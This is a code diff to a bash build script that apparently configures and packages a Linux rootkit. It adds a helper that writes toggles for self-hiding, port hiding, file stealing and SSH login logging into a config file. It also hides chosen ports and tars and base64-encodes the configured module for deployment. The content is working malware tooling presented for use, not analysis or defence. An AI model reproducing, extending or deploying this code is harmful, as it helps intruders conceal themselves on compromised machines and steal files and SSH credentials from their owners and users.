@@ -81,6 +81,13 @@ overwrite_placeholder(){
     for header in ${headers[@]}; do sed -i "s:${var_name}:${var_value}:" $header; done
 }
 
+toggle_setting(){ # $1 = name of toggle
+    local toggle_name="$1"
+    local toggle_status="`toggle_enabled $toggle_name`"
+    [ "$toggle_status" == "true" ] && { echo "${toggle_name}=1" && return; }
+    echo "${toggle_name}=0"
+}
+
 setup_configuration(){
     cp -r $MDIR/ $NEW_MDIR/ || { eecho "Couldn't copy module directory"; exit; }
 
@@ -100,9 +107,6 @@ setup_configuration(){
         local current_var="${var_placeholders[$i]}"
         settings+=(`get_setting "$current_var"`)
 
-        # if the current setting is that of a port to hide,
-        # add it to our array of hidden ports so that we can
-        # write it to the 'hide_ports' file.
         [ `toggle_enabled HIDE_PORTS` == "false" ] && continue  # don't if we don't need to
         IFS=':' read -r curvar_val curvar_name <<< "${settings[$i]}"
         [[ "$curvar_name" == *"PORT"* ]] && add_hiddenport $curvar_name $curvar_val
@@ -114,23 +118,27 @@ setup_configuration(){
     necho "Overwriting old variable placeholders"
     for selem in ${settings[@]}; do overwrite_placeholder "$selem" "${headers[*]}"; done
 
-    write_hideports $NEW_MDIR/hideports
+    [ "`toggle_enabled HIDE_PORTS`" == "true" ] && write_hideports $NEW_MDIR/hideports
 
     if [ $DOCOMPRESS == 1 ]; then
         [ ! -f `bin_path tar` ] && { eecho "Couldn't locate 'tar' on this machine."; exit; }
         echo; secho "Beginning compression of $NEW_MDIR"
-        verbose "Writing environment settings to $NEW_MDIR/settings"
+
+        verbose "Writing some necessary files to $NEW_MDIR"
+        verbose "Writing environment settings"
         write_defaults $NEW_MDIR/settings
 
+        verbose "Writing toggle settings"
+        local check_toggles=('ACCEPT_USE_SSL' 'USE_CRYPT' 'HIDE_SELF' 'HIDE_PORTS' \
+                             'FILE_STEAL' 'LOG_SSH') # these toggles are necessary for auto.sh to
+                                                     # check and react accordingly.
+        for toggle in ${check_toggles[@]}; do toggle_setting $toggle >> $NEW_MDIR/toggles.conf; done
+
         local tarname="$NEW_MDIR.tar.gz"
-        #echo; necho "Now compressing $NEW_MDIR, with gzip"
         verbose "tarball name = $tarname"
         sleep 1
-        tar cpfz $tarname $NEW_MDIR && \
-            secho "Finished compressing successfully" || \
-                eecho "Failure trying to compress with tar (gzip)"
-
-        [ ! -f $tarname ] && return
+        tar cpfz $tarname $NEW_MDIR || { eecho "Failure trying to compress with tar (gzip)" && return; }
+        secho "Finished compressing successfully"
 
         local tarb64="$NEW_MDIR.b64"
         necho "Writing $tarname into $tarb64"
